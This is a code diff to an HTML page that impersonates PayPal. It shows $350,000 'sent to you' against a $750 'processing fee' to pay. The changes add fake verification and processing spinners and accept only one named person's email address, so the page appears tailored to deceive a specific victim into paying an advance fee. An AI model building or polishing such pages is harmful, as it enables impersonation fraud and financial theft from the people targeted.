@@ -158,6 +158,21 @@
         .back-link:hover {
             text-decoration: underline;
         }
+
+        /* Spinner Styles */
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -170,7 +185,7 @@
             <h2>Enter PayPal Email</h2>
             <p>Put your registered PayPal email address to fetch your profile.</p>
             <input type="email" id="emailInput" placeholder="name@example.com">
-            <button class="btn-paypal" onclick="processEmail()">Continue</button>
+            <button class="btn-paypal" id="btnContinue" onclick="processEmail()">Continue</button>
             <br>
             <a class="back-link" onclick="alert('You are at the start of the flow.')">Back</a>
         </div>
@@ -189,46 +204,74 @@
             <div class="summary-box">
                 <div class="row">
                     <span>Amount Sent to You:</span>
-                    <strong style="color: green;">$150.00 USD</strong>
+                    <strong style="color: green;">$350,000.00 USD</strong>
                 </div>
                 <div class="row">
                     <span>Processing Fee:</span>
-                    <span>$5.00 USD</span>
+                    <span>$750.00 USD</span>
                 </div>
                 <div class="row total">
                     <span>Total to Pay:</span>
-                    <span>$5.00 USD</span>
+                    <span>$750.00 USD</span>
                 </div>
             </div>
 
-            <!-- Changed button to an anchor tag pointing to process.html and passing email via URL parameter -->
-            <a href="process.html" id="completePaymentBtn" class="btn-paypal">Complete Payment</a>
+            <a href="#" id="completePaymentBtn" class="btn-paypal" onclick="proceedToPayment(event)">Complete Payment</a>
             <br>
             <a class="back-link" onclick="goToStep(1)">Change Email</a>
         </div>
     </div>
 
     <script>
+        let savedEmail = "";
+
         function goToStep(stepNumber) {
             document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
             document.getElementById('step' + stepNumber).classList.add('active');
         }
 
         function processEmail() {
-            const email = document.getElementById('emailInput').value.trim();
-            if(!email || !email.includes('@')) {
-                alert('Please enter a valid PayPal email address.');
+            const emailInput = document.getElementById('emailInput');
+            const email = emailInput.value.trim();
+            
+            // Restrict working email strictly to mhilesjr@gmail.com
+            if(email !== "mhilesjr@gmail.com") {
+                alert('Please enter your correct registered email (mhilesjr@gmail.com).');
                 return;
             }
 
-            // Sets the email and fixes the name to John Daniel as requested
-            document.getElementById('displayName').innerText = "John Daniel";
-            document.getElementById('displayEmail').innerText = email;
+            savedEmail = email;
+            const btn = document.getElementById('btnContinue');
+            
+            // Show spinner & disable button
+            btn.innerHTML = '<span class="spinner"></span> Verifying...';
+            btn.style.pointerEvents = 'none';
 
-            // Pass the email to process.html via URL parameter so it auto-fills there too if needed
-            document.getElementById('completePaymentBtn').href = `process.html?email=${encodeURIComponent(email)}`;
+            // Wait for 2 seconds with loading spinner
+            setTimeout(() => {
+                document.getElementById('displayName').innerText = "John Daniel";
+                document.getElementById('displayEmail').innerText = email;
+                
+                // Reset button text
+                btn.innerHTML = 'Continue';
+                btn.style.pointerEvents = 'auto';
 
-            goToStep(2);
+                goToStep(2);
+            }, 2000);
+        }
+
+        function proceedToPayment(event) {
+            event.preventDefault();
+            const btn = document.getElementById('completePaymentBtn');
+
+            // Show spinner & disable button
+            btn.innerHTML = '<span class="spinner"></span> Processing...';
+            btn.style.pointerEvents = 'none';
+
+            // Wait for 2 seconds then navigate to process.html with email parameter
+            setTimeout(() => {
+                window.location.href = `process.html?email=${encodeURIComponent(savedEmail)}`;
+            }, 2000);
         }
     </script>
 </body>
